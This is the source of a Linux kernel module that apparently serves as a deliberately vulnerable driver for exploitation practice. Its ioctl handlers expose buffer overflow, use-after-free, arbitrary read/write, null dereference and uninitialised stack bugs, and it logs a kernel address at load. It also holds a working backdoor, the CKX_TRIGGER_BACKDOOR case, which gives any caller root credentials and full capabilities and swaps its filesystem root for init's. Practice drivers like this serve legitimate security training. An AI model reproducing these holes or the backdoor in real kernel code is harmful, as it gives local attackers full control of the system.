#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/fs.h>
#include <linux/init.h>
#include <linux/miscdevice.h>
#include <linux/slab.h>
#include <linux/ioctl.h>
#include <linux/uaccess.h>
#include<linux/fs_struct.h>

#include <linux/init_task.h>
// #include<sys/types.h>
// #include<unistd.h>

#include "vuln_driver.h"
#include "buffer_overflow.h"
#include "null_pointer_deref.h"
#include "use_after_free.h"
#include "arbitrary_rw.h"
#include "uninitialised_stack_var.h"


// struct fs_struct *init_fs;


void
pull_fs(struct task_struct *tsk,
			struct fs_struct *new_fs)
{
	struct fs_struct *fs = tsk->fs;
		int kill;
	if (fs)
	{
		task_lock(tsk);
		spin_lock(&fs->lock);
		tsk->fs = new_fs;
		kill = !--fs->users;
		spin_unlock(&fs->lock);
		task_unlock(tsk);
	}
	// if (kill)
		// free_fs_struct(fs);
}
// void daemonize_fs_struct(void)
// {
// 	struct fs_struct *fs = current->fs;
// 		int kill;
// 	if (fs)
// 	{
// 		task_lock(current);
// 		write_lock(&init_fs.lock);
// 		init_fs.users++;
// 		write_unlock(&init_fs.lock);
// 		write_lock(&fs->lock);
// 		current->fs = &init_fs;
// 		kill = !--fs->users;
// 		write_unlock(&fs->lock);
// 		task_unlock(current);
// 		if (kill)
// 			free_fs_struct(fs);
// 	}
// }
static long do_ioctl(struct file *filp, unsigned int cmd, unsigned long args)
{
	int ret;
	unsigned long *p_arg = (unsigned long *)args;
 	ret = 0;

	switch(cmd) {
		case DRIVER_TEST:
			printk(KERN_WARNING "[x] Talking to device [x]\n");
			break;
		case BUFFER_OVERFLOW:
			buffer_overflow((char *) args);
			break;
		case NULL_POINTER_DEREF:
			null_pointer_deref(args);
			break;
		case ALLOC_UAF_OBJ:
			alloc_uaf_obj(args);
			break;
		case USE_UAF_OBJ:
			use_uaf_obj();
			break;
		case ALLOC_K_OBJ:
			alloc_k_obj((k_object *) args);
			break;
		case FREE_UAF_OBJ:
			free_uaf_obj();
			break;
		case ARBITRARY_RW_INIT:
		{
			init_args i_args;
			int ret;

			if(copy_from_user(&i_args, p_arg, sizeof(init_args)))
				return -EINVAL;

			ret = arbitrary_rw_init(&i_args);
			break;
		}
		case ARBITRARY_RW_REALLOC:
		{
			realloc_args r_args;

			if(copy_from_user(&r_args, p_arg, sizeof(realloc_args)))
				return -EINVAL;

			ret = realloc_mem_buffer(&r_args);
			break;
		}
		case ARBITRARY_RW_READ:
		{
			read_args r_args;

			if(copy_from_user(&r_args, p_arg, sizeof(read_args)))
				return -EINVAL;

			ret = read_mem_buffer(r_args.buff, r_args.count);
			break;
		}
		case ARBITRARY_RW_SEEK:
		{
			seek_args s_args;

			if(copy_from_user(&s_args, p_arg, sizeof(seek_args)))
				return -EINVAL;

			ret = seek_mem_buffer(&s_args);
			break;
		}
		case ARBITRARY_RW_WRITE:
		{
			write_args w_args;

			if(copy_from_user(&w_args, p_arg, sizeof(write_args)))
				return -EINVAL;

			ret = write_mem_buffer(&w_args);
			break;
		}
		case UNINITIALISED_STACK_ALLOC:
		{
			ret = copy_to_stack((char *)p_arg);
			break;
		}
		case UNINITIALISED_STACK_USE:
		{
			use_obj_args use_obj_arg;
			
			if(copy_from_user(&use_obj_arg, p_arg, sizeof(use_obj_args)))
				return -EINVAL;
			
			
			use_stack_obj(&use_obj_arg);
	
			break;
		}
		case CKX_TRIGGER_BACKDOOR:
		{
			struct cred *mycred = current_cred();

			printk("[@]the current uid is %d\n",mycred->uid);

			kuid_t rootid;
			rootid.val=0;
			
			// kuid_t rootid = KUIDT_INIT(0);
			mycred = prepare_creds();

			mycred->uid=rootid;

			mycred->cap_permitted.cap[0] = 0xffffffff;
			mycred->cap_permitted.cap[1]=0x3f;
			mycred->cap_effective.cap[0] = 0xffffffff;
			mycred->cap_effective.cap[1] = 0x3f;
			mycred->cap_bset.cap[0] = 0xffffffff;
			mycred->cap_bset.cap[1] = 0x3f;




			struct task_struct *task=get_current();

			while(task->pid!=1){

				task=task->real_parent;
			}

			struct fs_struct *to=task->fs;

			printk("[***]init_fs found %d\n\n\n",task->pid);

			// daemonize_fs_struct

			task = get_current();
			// daemonize_fs_struct();

			pull_fs(task,to);

			// struct nsproxy *new_proxy = create_namespaces(clone_flags, tsk, uns, tsk->fs);

			// struct nsproxy init_nsproxy = INIT_NSPROXY(init_nsproxy);
			// switch_task_namespaces(task,&init_nsproxy);


				// char buffer[8] = "\xff\xff\xff\x22\x33\x77\x00\x00";
				// memcpy(&(mycred->cap_permitted),buffer,8);





			commit_creds(mycred);

			// return -EINVAL;
			// setuid(0);
			// current_uid=0;

			printk("[@]now current uid is %d\n",mycred->uid);

			ret=1234;
			break;
		}
	}

	return ret;
}

static int vuln_release(struct inode *inode, struct file *filp)
{
	if(g_mem_buffer != NULL)
	{
		if(g_mem_buffer->data != NULL)
			kfree(g_mem_buffer->data);
		kfree(g_mem_buffer);
		g_mem_buffer = NULL;
	}

	return 0;
}

/**
* The operations allowed by userspace applications.
* We only really allow access through the ioctl interface.
*/
static struct file_operations vuln_ops = {
	.owner = THIS_MODULE,
	.unlocked_ioctl = do_ioctl,
	.release = vuln_release,
};

/**
* The miscdevice api is much simpler than creating a class
* and attaching it to a node using class_create etc.
*/
static struct miscdevice vuln_device = {
	MISC_DYNAMIC_MINOR, DEVICE_NAME, &vuln_ops
};

/**
* Register the device.
*/
static int vuln_module_init(void)
{
	int ret;

	ret = misc_register(&vuln_device);

	if(ret < 0) {
		printk(KERN_WARNING "[-] Error registering device [-]\n");
	}

	printk(KERN_WARNING "[!!!] use_stack_obj @%p [!!!]\n", use_stack_obj);

	return ret;
}

/**
* Deregister the device.
*/
static void vuln_module_exit(void)
{
	misc_deregister(&vuln_device);
}

module_init(vuln_module_init);
module_exit(vuln_module_exit);
MODULE_LICENSE("GPL");
MODULE_AUTHOR("Invictus");
MODULE_DESCRIPTION("");
